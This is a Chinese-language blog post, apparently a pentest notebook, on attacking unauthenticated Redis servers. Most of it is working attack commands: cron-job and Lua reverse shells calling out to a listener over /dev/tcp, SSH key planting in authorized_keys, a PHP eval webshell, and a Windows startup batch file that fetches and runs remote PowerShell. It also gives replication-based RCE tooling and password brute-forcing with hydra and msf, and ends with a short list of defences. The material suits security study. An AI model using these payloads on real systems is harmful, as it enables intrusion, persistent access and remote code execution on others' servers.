# redis漏洞利用



## 准备
1.下载编译
```bash
wget http://download.redis.io/releases/redis-6.0.3.tar.gz
tar xzf redis-6.0.3.tar.gz
cd redis-6.0.3
make
```

2.拷贝二进制文件
```bash
cd src/

cp redis-server /usr/bin 
cp redis-cli /usr/bin

cd ..
cp redis.conf /etc/
```

3.修改`redis.conf`, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴)

<img src="http://image.xpshuai.cn/20200525210801776_1038672757.png"/>

4.启动redis服务

```bash
redis-server  /etc/redis.conf

# 或者直接以非保护模式运行也可以
./redis_server --protected-mode no
```



5.连接redis的方式
```bash
# nc
nc 1.1.1.1.10 6379 -vv    

# telent 

#或redis-cli连接
redis-cli -h 192.168.0.100
```



常用命令
```bash
# 查看里面的key和其对应的值
keys *  
get key


# 获取备份路径
config get dir

# 获取备份文件名
config get dbfilename
save  # 保存数据到备份路径(dir+dbfilename)

# 设置备份路径
config set dir /root/ # 可以移动到root，然后访问（如果能访问，就是root权限 -->可用来判断权限）

# 设置备份文件名
config set dbfilename filename

# 设置键值对
set keyname value
# 获取键值对
get keyname

# 持久化(保存到磁盘)
save
```


## 测试
#### 一、写文件(利用未授权访问)
测试环境：centos

###### 1.crontab计划任务反弹shell
>root权限运行redis

1.本机监听端口
```bash
nc -lvvp 4444
```

2.利用redis生成计划任务配置文件
```bash
set -.- "\n\n\n* * * * * bash -i >& /dev/tcp/192.168.0.106/5555 0>&1\n\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

3.本机获得反弹shell

**Note:**
当目标主机为centos时可以反弹shell, 而ubuntu和debian均无法成功反弹shell。
原因：由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划。



###### 2.直接写入公钥
>root权限运行redis， 且目标主机开启了ssh密钥登录

```bash
# 本机先生成密钥
ssh-keygen -t rsa
# 公钥内容导入key.txt文件
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

#
config set dir /root/.ssh/
config set dbfilename authorized_keys
set test6 "\n\n\nssh key\n\n\n ssh-rsa xxxxxxxxxxxxx" (公钥的值)
save

# 然后本机直接连接目标
ssh  -o StrictHostKeyChecking=no 192.168.0.100
```

同时也要注意系统的乱码问题

<img src="http://image.xpshuai.cn/20200525224703847_1050926657.png"/>


###### 3.低权限写入WebShell
>需要知道网站路径

```bash
config set dir /var/www/html/    # 需要知道网站的绝对路径
config set dbfilename 1.php
set 1 "<?php eval($_POST[1]); ?>"
save

# 访问webshell
```
<img src="http://image.xpshuai.cn/20200525222440751_1498038879.png"/>


###### 4.开机自启目录
>前提：redis部署在windows主机上

```bash
# 写入批处理文件到Administrator用户的开机启动目录
# 使用powershell远程下载执行我们的程序
config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
config set dbfilename add.bat
set xx "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX((New-ObjectNet.WebClient).DownloadString('http://xxx.xx.xxxx/add'))\"\r\n\r\n"
save
```



**拓展攻击方法**
- 信息泄漏(很多redis没设置密码，寻找敏感信息)
- 配合ssrf
- 本地lua代码
- 本地提权
- 等等

###### 5.写入挖矿进程


###### nmap检测
```bash
nmap -p 6379 --script redis-info 192.168.0.100
#地址:https://svn.nmap.org/nmap/scripts/redis-info.nse
```
<img src="http://image.xpshuai.cn/20200525225557672_1832619508.png"/>


######  安全检查
```bash
#1.查看redis运行的用户权限
ps -aux |grep redis

#2.查看所有用户ssh验证文件是否异常
/user/.ssh/authorized_keys

#3.查看crontab
/var/spoof/cron/

#4.查看crontab的日志
tail /var/log/cron
```



#### 二、Redis-RCE
利用用前提是获取redis访问权限,也就是基于redis未授权访问

###### 1.redis主从同步rce
>使用范围redis 4.x-5.0.5

在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令
```bash
git clone https://github.com/Ridter/redis-rce.git
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git

# 编译so文件
cd RedisModules-ExecuteCommand/
make

# 运行sss
python redis-rce.py -r <目标地址>  -L <本机地址> -f module.so
# 执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell
```


###### 2.反序列化rce
当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。
```
jackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如["com.blue.bean.User",xxx]
fastjson：关注有没有 @type 字段
jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名
```
https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q



###### 3.lua rce
>适用于高权限运行低版本redis的lua虚拟机，写文件失败时进行尝试

使用`info server` 和 `eval “return _VERSION” 0 `命令可以查看当前redis版本和编译信息。

exp
```
https://github.com/QAX-A-Team/redis_lua_exploit/
```

修改`redis_lua.py`中目标地址为靶机的地址和端口

<img src="http://image.xpshuai.cn/20200526092701919_308935847.png"/>

运行exp

执行成功后就可以进行命令执行了，这里反弹shell
```bash
eval "tonumber('/bin/bash -i >& /dev/tcp/192.168.0.105/5555 0>&1', 8)" 0
```


#### 三、redis密码爆破

1.使用redis-cli连接，使用-a参数指定密码操作。
```bash
redir-cli -h 192.168.0.100 -a admin123
# 这个好像没这么实用感觉，也许可以写成脚本批量跑
```


2.msf的`auxiliary/scanner/redis/redis_login`模块
```bash
use auxiliary/scanner/redis/redis_login
set rhost ...
set threads ...
set pass_file xxxxxxx.txt
run
```
<img src="http://image.xpshuai.cn/20200526094633220_1454687311.png"/>

3.hydra
```bash
# 还是hydra好用，速度还快
hydra -P redis_pass.txt redis://192.168.0.100
```
<img src="http://image.xpshuai.cn/20200526095113424_1824777352.png"/>


## 防御手段
- 禁止root运行redis
- 设置账户密码认证
- 服务部署使用单独低权限账户
- 添加IP访问限制(bind),并更更改默认6379端口
- redis在默认情况下，是不会生成日志文件的，所以需要修改配置文件，让redis生成日志，以及设置日志等级
- 保证 authorized_keys 文件的安全（`chmod 400 ~/.ssh/authorized_keys`）
- 设置防火墙策略　


**参考链接**
https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q
https://www.freebuf.com/column/158065.html


---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/  

